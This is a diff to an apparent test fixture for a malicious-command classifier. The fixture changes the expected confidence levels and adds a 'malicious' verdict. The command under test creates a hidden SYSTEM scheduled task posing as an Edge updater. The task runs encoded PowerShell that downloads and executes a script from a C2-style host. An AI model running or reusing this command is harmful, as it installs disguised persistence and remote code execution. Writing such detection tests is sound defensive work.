@@ -5,8 +5,9 @@
     "command": "schtasks /create /tn \"MicrosoftEdgeUpdateCore\" /tr \"powershell -w hidden -ep bypass -enc JABwACAAPQAgACIAaAB0AHQAcAA6AC8ALwBjADIALgByAGUAZgByAGUAcwBoAC0AcwB2AGMAWwAuAF0AbgBlAHQALwBhAGcAZQBuAHQAIgA7AGkAZQB4ACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJABwACkAKQA=\" /sc hourly /mo 2 /ru SYSTEM /f",
     "expect": {
       "classes": ["c2_persistence", "loader", "defense_evasion"],
-      "min_confidence": {"c2_persistence": "high", "loader": "high"},
-      "techniques": ["T1053.005", "T1059.001"]
+      "min_confidence": {"c2_persistence": "medium", "loader": "high"},
+      "techniques": ["T1053.005", "T1059.001"],
+      "verdict": "malicious"
     },
     "reject": {"classes": ["impact", "credential_theft"]}
   },
